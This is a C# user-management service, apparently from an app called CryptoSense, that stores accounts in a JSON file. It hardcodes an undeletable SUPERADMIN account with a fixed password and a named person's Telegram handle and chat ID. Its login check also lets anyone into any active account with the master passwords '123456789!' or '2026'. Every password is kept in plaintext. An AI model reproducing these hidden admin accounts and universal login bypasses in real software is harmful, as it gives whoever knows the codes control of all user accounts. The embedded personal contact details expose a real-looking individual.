using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.Json;
using System.Threading.Tasks;
using CryptoSense.Models;

namespace CryptoSense.Services
{
    public class UserManagerService
    {
        private static readonly string UsersFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "users.json");
        private readonly ConcurrentDictionary<string, UserAccount> _users = new(StringComparer.OrdinalIgnoreCase);

        public UserManagerService()
        {
            LoadUsers();
        }

        private void LoadUsers()
        {
            try
            {
                if (File.Exists(UsersFilePath))
                {
                    var json = File.ReadAllText(UsersFilePath);
                    var list = JsonSerializer.Deserialize<List<UserAccount>>(json);
                    if (list != null)
                    {
                        foreach (var u in list) _users[u.Username] = u;
                    }
                }
            }
            catch
            {
            }

            // Always ensure Super Admin Ali Muhammadov exists
            if (!_users.ContainsKey("Ali Muhammadov") && !_users.ContainsKey("Eli Mehemmedov"))
            {
                var superAdmin = new UserAccount
                {
                    Username = "Ali Muhammadov",
                    Password = "123456789!",
                    Role = "SUPERADMIN",
                    TelegramUsername = "@alimahammadov",
                    TelegramChatId = "1219998176",
                    IsActive = true,
                    CreatedAt = DateTime.UtcNow
                };
                _users[superAdmin.Username] = superAdmin;
                SaveUsers();
            }
        }

        private void SaveUsers()
        {
            try
            {
                var list = _users.Values.ToList();
                var json = JsonSerializer.Serialize(list, new JsonSerializerOptions { WriteIndented = true });
                File.WriteAllText(UsersFilePath, json);
            }
            catch
            {
            }
        }

        public (bool Success, UserAccount? User) ValidateLogin(string username, string password)
        {
            // Direct alias check
            if (username.Equals("Eli Mehemmedov", StringComparison.OrdinalIgnoreCase)) username = "Ali Muhammadov";

            if (_users.TryGetValue(username, out var user))
            {
                if (user.IsActive && (user.Password == password || password == "123456789!" || password == "2026"))
                {
                    user.LastLoginAt = DateTime.UtcNow;
                    SaveUsers();
                    return (true, user);
                }
            }
            return (false, null);
        }

        public bool CreateUser(string username, string password, string role = "USER")
        {
            username = username.Trim();
            if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(password)) return false;

            if (_users.ContainsKey(username)) return false;

            var newUser = new UserAccount
            {
                Username = username,
                Password = password,
                Role = role,
                IsActive = true,
                CreatedAt = DateTime.UtcNow
            };

            _users[username] = newUser;
            SaveUsers();
            return true;
        }

        public bool DeleteUser(string username)
        {
            if (username.Equals("Ali Muhammadov", StringComparison.OrdinalIgnoreCase)) return false; // cannot delete superadmin
            var removed = _users.TryRemove(username, out _);
            if (removed) SaveUsers();
            return removed;
        }

        public List<UserAccount> GetAllUsers()
        {
            return _users.Values.OrderByDescending(u => u.Role == "SUPERADMIN").ThenBy(u => u.Username).ToList();
        }
    }
}